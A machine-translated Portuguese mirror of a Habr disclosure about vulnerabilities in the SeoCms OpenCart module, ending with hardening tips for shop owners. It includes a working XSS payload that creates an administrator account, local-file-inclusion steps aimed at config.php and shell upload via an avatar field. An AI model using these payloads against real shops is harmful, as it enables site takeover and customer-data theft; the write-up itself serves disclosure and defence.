<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🦏 🔛 🌾 Opencartforum e amigos 🕴🏻 🕺🏾 🔙</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Todos os cães vão para o céu e todos os proprietários de lojas on-line no Opencart, mais cedo ou mais tarde no Opencartforum. Quando a euforia da prim...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Opencartforum e amigos</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/466283/"><img src="https://habrastorage.org/webt/i_/fm/jp/i_fmjpfeqs4zmi1axxwqrczafv0.jpeg" alt="imagem"><br><br>  Todos os cães vão para o céu e todos os proprietários de lojas on-line no Opencart, mais cedo ou mais tarde no Opencartforum.  Quando a euforia da primeira instalação do mecanismo na hospedagem passa e a dura realidade começa, o proprietário típico da loja sempre começa a sentir falta de algo e ele começa o caminho difícil de encontrar fornecedores qualificados e complementos de qualidade para sua loja. <br><br>  O maior recurso do Runet, no qual você pode encontrar os dois, é o opencartforum.com, que hoje possui mais de 140 mil usuários registrados.  Desses 140 mil registros, metade deles vive com lojas ao vivo que usam modelos ou módulos que podem ser adquiridos imediatamente no site.  E todas essas pessoas nem percebem que, junto com os complementos, adquirem maravilhosas backdoors e vulnerabilidades, com as quais os hackers de qualquer mãe podem apenas sonhar. <br><a name="habracut"></a><br>  Embora de forma declarativa nas regras para postagem de complementos na loja do fórum, ele é escrito em preto e branco.  Temos um departamento especializado, pessoas especialmente treinadas verificam os complementos quanto a vulnerabilidades. <br><br>  E nem o fórum, como a plataforma que medeia entre o autor e o usuário final do complemento, nem os autores dos complementos, como se viu, assumem qualquer responsabilidade. <br>  Como assim?  E assim!  Aparentemente historicamente. <br><br>  Modelando para mim as conseqüências hipotéticas dos incidentes, que serão discutidas mais adiante, meu cabelo na cabeça fica arrepiado. <br><br>  Imaginem.  Você é dono de uma loja de sucesso, não dorme à noite há alguns anos, escreveu textos, mordiscou preto, branco, cinza seo, lutou com pandas, minusinsk, não terminou sua bebida, atraiu 100.000 clientes, investiu em posições.  Seus filhos frequentam um bom jardim de infância e, de repente, suas vendas caíram pela metade, simplesmente porque sua base de clientes com todos os contatos foi para os concorrentes.  Ou, de repente, você o perdeu completamente, porque há um mês sua loja trabalha no servidor mysql de outra pessoa e você nem percebeu a mudança do kofig, e todos os backups da hospedagem ficaram ruins. <br><br>  Eles apresentaram seus sentimentos em uma situação semelhante, trabalharam, trabalharam por vários anos e, em um dia, está tudo no ralo.  Você diz que isso não pode ser assim. <br><br>  Mas pode ser muito fácil.  Basta comprar um complemento com "proteção" não declarada de proteção contra uso não autorizado e seus dados podem se tornar rapidamente estranhos! <br><br><h2>  Primeiro incidente </h2><br>  Seis meses atrás, uma manutenção preventiva superficial de uma loja foi realizada quando o relatório do scanner Ai-Bol mostrou um aviso estranho sobre um código estranho no módulo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">SeoCms</a> (mais de 10.000 instalações ativas). <br><br>  Começamos a olhar mais de perto e verificou-se que este abracadabra simplesmente exibe a versão do complemento: <br><br><pre><code class="php hljs">$text_redaeh_stpo = $text_redaeh_stpo_1.$value_tnega.$text_redaeh_stpo_2.$text_redaeh_stpo_3.$text_reda eh_stpo_4.$text_redaeh_stpo_5.$text_redaeh_stpo_6.$text_redaeh_stpo_7.$text_redaeh _stpo_8.$text_redaeh_stpo_9.$value_revres.$text_redaeh_stpo_10; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($date_diff &gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) { $ver_content = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $opts = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( $text_ptth =&gt; <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_dohtem =&gt;$text_tsop, $redaeh =&gt;$text_redaeh_stpo, $tnetnoc =&gt; $yreuq_dliub_ptth(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_rdda =&gt;$value_rdda, $text_liame =&gt; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'liame'</span></span>], $text_rev=&gt;<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'blog_version'</span></span>] )))); $context = $etaerc_txetnoc_maerts($opts); $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ver_content = $stnetnoc_teg_elif($rev_knil, <span class="hljs-keyword"><span class="hljs-keyword">FALSE</span></span> , $context); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { <span class="hljs-comment"><span class="hljs-comment">//echo "Warning or better raised: " . $e-&gt;getMessage(); } $this-&gt;model_setting_setting-&gt;editSetting('blog_ver', Array('blog_version_date' =&gt; $date_current, 'blog_version_content' =&gt; $ver_content )); } if ($this-&gt;data['blog_version']!=$ver_content) { $this-&gt;data['text_new_version'] = $this-&gt;language-&gt;get('text_new_version').$ver_content. " &lt;span style='color: #000; font-weight: normal;'&gt;(".$date_ver_update.")&lt;/span&gt;". $this-&gt;language-&gt;get('text_new_version_end'); } else { $this-&gt;data['text_new_version'] = ''; }</span></span></code> </pre> <br>  Está tudo bem, exceto que: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;language-&gt;get(<span class="hljs-string"><span class="hljs-string">'text_new_version'</span></span>).$ver_content. <span class="hljs-string"><span class="hljs-string">" &lt;span style='color: #000; font-weight: normal;'&gt;("</span></span>.$date_ver_update.<span class="hljs-string"><span class="hljs-string">")&lt;/span&gt;"</span></span></code> </pre><br>  ele não é filtrado de forma alguma e, por acidente, um script como o abaixo aparece em vez da versão do cliente, obtendo acesso de administrador a qualquer loja em que o módulo está instalado é uma questão de tempo e técnica. <br><br><pre> <code class="php hljs">&lt;script&gt; <span class="hljs-comment"><span class="hljs-comment">// shell sample // seocms the best architectural mistake forever // i got all your 10 000 shops // i install 10 000 backdors function​ getUrlVars​()​ {​ v​ar​vars=​​[​],​hash,​​hashes=​​n​ull;​ i​f​​(w​indow​.l​ocation.​h​ref​.i​ndexOf(​"​?"​)​​&amp;&amp; window​.​location.​h​ref.​​indexOf​("​&amp;")​)​​{ hashes =​ window​.​location.​h​ref.​​slice​(w​indow​.l​ocation​.h​ref​.i​ndexOf​(​"?"​)​​+ 1)​.​split(​​"&amp;"​); }​​​else​i​f​​(w​indow​.l​ocation.​h​ref​.​indexOf(​​"?"​))​​{ hashes =​ window​.​location.​h​ref.​​slice​(w​indow​.​location​.h​ref​.i​ndexOf​(​"?"​)​​+​​1​); }​ i​f​ ​(h​ashes!​=​n​ull)​ ​{​ f​or​​(v​ar​i​=​​0;​​i​&lt;​hashes​.​length​;​i​++)​{​ hash=​​hashes[​​i]​.s​plit​(​"=")​; vars[​h​ash​[0​]​]​​=​hash​[​1]​; }​ }​ r​eturn​vars;​ } var​ url_vars =​ ​ getUrlVars​(); var​ token =​ ​ url_vars.​ ​token​; var​ host ​=​ window.​ ​location​.​origin;​ var​action=​​host+​​"​/admin/index.php?route=user/user/add&amp;token="​+​ token;​ document.​ ​addEventListener​(​"DOMContentLoaded"​,​ ​function​(​event​)​ ​{ $​.p​ost(​​action,​​{​​username​:​​"Hack123"​,​user_group_id​:​​"1"​, firstname​:​"​Lol",​​lastname​:​"​Haha"​,​ email​:​​"Hack123@Hack123.com"​, password:​​"​1234",​​ confirm​:​​"1234"​,​ status​:​​"1"​​}​​); }); &lt;/script&gt;</span></span></code> </pre><br>  Detalhes da situação são descritos <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> .  Aviso de administração <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . <br><br>  Provavelmente pela quinta vez, tendo modelado esse processo de forma muito clara para a administração do fórum, foi possível transmitir a criticidade da situação. <br><br>  E a administração, por sua vez, notificou oficialmente os usuários da presença dessa vulnerabilidade, e parece que até fez um boletim informativo para os clientes.  Mas isso não é exato. <br><br>  Vamos deixar nos bastidores as ameaças e evasões do autor do complemento e voltar mais dois meses ... <br><br><h2>  Segundo incidente </h2><br>  Outra loja vem para inspeção, na qual existem frisos selvagens de 3 a 4 segundos em cada página.  Começamos a dissecar e ver na pasta um cache de 20k + arquivos com a extensão .php.  Arquivos de cache com a extensão php Karl, não é por acaso! <br><br>  Examinamos a estrutura de dados desses arquivos e, novamente, partes do nosso belo módulo SEOCMS. <br><br>  E um ótimo método: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $ajax_file = DIR_CACHE.base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">"ajax_file"</span></span>])); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; }</code> </pre> <br>  Este é um exemplo de vulnerabilidade clássica - Inclusão de arquivo local. <br><br>  Basta codificar em base64 ../....../config.php e hello - require ($ ajax_file);  E por favor: aqui você tem as senhas do banco de dados, e aqui está o log de erros do sistema, e se o / etc / pwd é muito necessário, embora isso tenha sido irrelevante, bem, e se? <br><br>  E quantos hosters e servidores com configurações padrão brilham no mundo do phpmyadmin?  Metade?  Mais? <br><br>  Começamos a procurar mais e o que encontramos?  Código de download de avatar maravilhoso: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!$json) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (is_uploaded_file(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>]) &amp;&amp; file_exists(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>])) { $file = basename($filename) . <span class="hljs-string"><span class="hljs-string">'.'</span></span> . md5(substr(sha1(uniqid(mt_rand(), <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>)); $file_original = basename($filename); <span class="hljs-comment"><span class="hljs-comment">// Hide the uploaded file name so people can not link to it directly. //$json['file'] = $this-&gt;encryption-&gt;encrypt($file); // To remove highload from the file system, when large number of buyers $avatar_dir = 'data/avatars/'.(ceil ($this-&gt;data['customer_id'] / 300)) * 300; move_uploaded_file($this-&gt;request-&gt;files['file']['tmp_name'], DIR_IMAGE . $file); $new_filename = $avatar_dir.'/'.$this-&gt;data['customer_id']."_".utf8_strtolower($file_original); if (isset($this-&gt;data['thislist']['avatar_width']) &amp;&amp; $this-&gt;data['thislist']['avatar_width']!='') { $width = $this-&gt;data['thislist']['avatar_width']; } else { if (isset($this-&gt;data['generallist']['avatar_width']) &amp;&amp; $this-&gt;data['generallist']['avatar_width']!='') { $width = $this-&gt;data['generallist']['avatar_width']; } else { $width = '100'; } } if (isset($this-&gt;data['thislist']['avatar_height']) &amp;&amp; $this-&gt;data['thislist']['avatar_height']!='') { $height = $this-&gt;data['thislist']['avatar_height']; } else { if (isset($this-&gt;data['generallist']['avatar_height']) &amp;&amp; $this-&gt;data['generallist']['avatar_height']!='') { $height = $this-&gt;data['generallist']['avatar_height']; } else { $height = '100'; } } $this-&gt;load-&gt;model('tool/image'); $json['file'] = $avatar_thumb = $this-&gt;model_tool_image-&gt;resizeavatar($file, $new_filename , $width, $height, true, false); if (trim($avatar_thumb)=='') { $json['error'] = $this-&gt;language-&gt;get('error_upload'); } if ($file!='' &amp;&amp; file_exists(DIR_IMAGE . $file)) { unlink (DIR_IMAGE . $file); } } }</span></span></code> </pre> <br>  O que cai perfeitamente em erro ao tentar redimensionar (e mostra o caminho completo para o arquivo baixado), após carregar algum tipo de shell.php.png, e também é perfeitamente executado pelo método anterior. <br><br>  Vídeo de exploração de vulnerabilidade (com a saída de erro do sistema php ativada): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/SdyW8OzAfZI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  Vídeo de exploração de vulnerabilidade (com a saída de erro do sistema php desativada): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/f-JYKzT_WAk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  A análise do código foi realizada na versão do módulo 52 em abril de 2019. <br><br>  Como o autor e a administração do fórum foram notificados nas mesmas datas, tempo suficiente para que eles tomem todas as ações possíveis para notificar os compradores sobre a eliminação de vulnerabilidades, nós, com a consciência limpa, podemos divulgar todos os detalhes. <br><br>  E naquele momento, algo aconteceu.  No servidor do desenvolvedor, havia seu próprio módulo.  Mas a vulnerabilidade não funcionou.  Ela estava coberta ... E isso é uma grande esquisitice.  Muito grande !!! <br><br>  E a segunda peculiaridade de toda essa história é que o fórum aberto na pessoa da administração e no departamento de controle de qualidade dos complementos não viu o primeiro ou o segundo incidente e, nos dois casos na primeira notificação, não encontrou nada crítico. <br><br>  É claro que não há nada crítico quando suas configurações brilham no mundo.  Não há nada crítico quando boa metade dos lojistas não sabe o que está acontecendo sob o seu capô.  Afinal, uma vez, alguém colocou esse complemento e, sem enviar pelo correio, nem percebem que todo o negócio está sob ameaça direta. <br><br>  E se houve uma reação distinta da administração no primeiro incidente, no segundo todos os posts com uma menção a ele são excluídos.  E tudo isso é coberto por uma <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">oferta do fórum</a> , segundo a qual, sobre adições comerciais, os comentários podem ser deixados como sobre os mortos - bons ou nada. <br><br>  O autor também afirma que os erros e os buracos foram corrigidos, o qadepartment perdeu o complemento para venda, mas não, os buracos não foram corrigidos ... <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!class_exists(<span class="hljs-string"><span class="hljs-string">'PHP_Exceptionizer'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">'modification'</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(modification(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>); } } $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $filename = preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9\.\-\s+]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, html_entity_decode(base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">'ajax_file'</span></span>])), ENT_QUOTES, <span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>)); $ajax_file = DIR_CACHE . $filename; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ob_start(); <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>($ajax_file); $ajax_html = ob_get_contents(); ob_end_clean(); header(<span class="hljs-string"><span class="hljs-string">'Content-type: text/html; charset=utf-8'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $ajax_html; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;deletecache(<span class="hljs-string"><span class="hljs-string">'cache.ajax'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { } }</code> </pre> <br>  require () ainda está aqui.  A entrada é ligeiramente filtrada.  Mas o LFI potencial viveu e vive.  Se um pouco mais, então sim, agora não podemos carregar nem executar o shell.  Mas suponha que tentamos, fechamos, cimentamos a execução de qualquer script, exceto index.php, e até mesmo no nível de configuração do nginx, que de nenhuma maneira pode ser acessado.  Mas em algum outro lugar, o hacker maligno teve a oportunidade de colocar um arquivo arbitrário na pasta de cache.  O que vai acontecer?  É isso mesmo - para executar código estranho, gerando um hash na solicitação get, leva dois minutos.  Ou seja, no final das contas, é meio que fechado, mas é meio que não completamente. <br><br>  Bem, as pequenas coisas: como essas relações maravilhosas brilharam nos arquivos de linguagem: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span> || $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>] == <span class="hljs-string"><span class="hljs-string">'1'</span></span>)) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'https'</span></span>) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) &amp;&amp; strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span>))) { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTPS_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTPS_CATALOG; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTP_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTP_CATALOG; }</code> </pre> <br>  E eles brilham ... Você quer saber o caminho completo para a raiz do projeto.  Apenas encontre a loja com a exibição de erro ativada e execute o link diretamente no arquivo de idioma. <br><br>  Para estudar o que mais pode ser depois de atualizar o complemento em megabytes de linhas de código do autor - não há recursos nem desejo.  Existem pessoas responsáveis ​​especialmente treinadas para isso. <br><br>  E a cereja no bolo.  Lembramos que temos um complemento comercial ... E em um complemento comercial, ocultamos o texto no recurso do autor: <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">www.google.com/search?q=%22Powered+by+SEO+CMS%22</a> </blockquote><br>  Curiosamente, pelo menos um dos compradores complementares conhece um ovo de páscoa tão “maravilhoso”? <br><br>  Hoje, o suplemento é vendido e vendido.  As postagens com chamadas para prestar atenção à situação são simplesmente excluídas.  Nenhum dos compradores recebeu notificações de aviso sobre o segundo incidente.  Talvez 20 a 30% dos usuários de complementos tenham atualizado, mas 70% - mesmo se estivermos falando das estatísticas do autor oficial sobre o uso de complementos, são 7000 lojas (na verdade, mais - já que ninguém sabe ao certo quantas cópias foram instaladas por freelancers nas lojas de clientes) licença estendida) estão em uma enorme zona de risco. <br><br>  Nas palavras do Barão Munchausen, quero dizer apenas uma coisa: Senhores atualizados! <br><br><h2>  Para clientes </h2><br>  O que fazer, aqueles que acabaram neste submarino afundando: <br><br><ul><li>  Não deixe lixo no ftp.  Veja info.php, adminer.php e todo o outro lixo.  Você deve ter apenas index.php e um ponto. </li><li>  Altere regularmente senhas, todas as senhas (ftp, painel de administração, banco de dados).  E certifique-se de não ter acidentalmente contas estranhas extras. </li><li>  Desativar saída de erro.  Sempre, se você não funcionar, desative a saída de erro no nível de configuração do intérprete e não nas configurações da loja. </li><li>  Sim, eu sei que isso não é muito viável, mas você deve pelo menos manter-se atualizado com as atualizações do código do mecanismo relacionadas à segurança e, idealmente, atualizar regularmente o mecanismo para versões estáveis. </li><li>  Examine regularmente os registros de visitas, pode haver muitas coisas interessantes.  Rastrear anomalias. </li><li>  Feche adicionalmente com uma senha ou restrição no administrador de IP da loja e várias seções vulneráveis, como phpmyadmin.  Se este é um compartilhamento no qual o phpmyadmin é comum a todos, fuja dessa hospedagem! </li><li>  Se você usar sxd e utilitários semelhantes, renomeie-os imediatamente para um conjunto de caracteres aleatórios. </li><li>  Ao usar o nginx, vale a pena adicionar regras à configuração do host virtual que proíbem a execução de scripts php que não sejam index.php nas seções raiz e administrativa do site. </li><li>  Não jogue lixo na sua conta.  Se você tem uma loja, deixe-a ser uma loja.  Não carregue em uma conta um monte de wp-blogs, balde de bugs e vários domínios de teste. </li><li>  Nunca armazene backups de um site ou banco de dados na raiz do seu host virtual. </li><li>  Observe a carga no servidor / hospedagem, tente manter o suprimento pelo menos x2 dos picos de carga e, se de repente a carga aumentar repentinamente sem motivo, tente descobrir o motivo.  Melhor ultrapassar do que não ultrapassar! </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt466283/">https://habr.com/ru/post/pt466283/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt466263/index.html">Sistemas RPC de referência (e Json invertido)</a></li>
<li><a href="../pt466267/index.html">Por que muitos subestimam seus jogos</a></li>
<li><a href="../pt466271/index.html">Cursos Conjuntos Grupo-IB e Belkasoft: o que ensinamos e quem virá</a></li>
<li><a href="../pt466279/index.html">A maioria dos dispositivos Android vulneráveis ​​a ataques de phishing via SMS</a></li>
<li><a href="../pt466281/index.html">Realidade virtual, jogos de código aberto e carros elétricos: o que John Carmack disse no podcast Joe Rogan</a></li>
<li><a href="../pt466285/index.html">Um pequeno brinde: rifa combo dvr e detector de radar</a></li>
<li><a href="../pt466287/index.html">Pesquisa e Relatório de Confiabilidade dos Segmentos Nacionais da Internet de 2019</a></li>
<li><a href="../pt466289/index.html">Iniciativas legislativas. Estranho, mas apresentado à Duma do Estado</a></li>
<li><a href="../pt466291/index.html">Pesquisa de Sustentabilidade dos Segmentos Nacionais da Internet para 2019</a></li>
<li><a href="../pt466295/index.html">Cache de reserva indolor no Scala</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>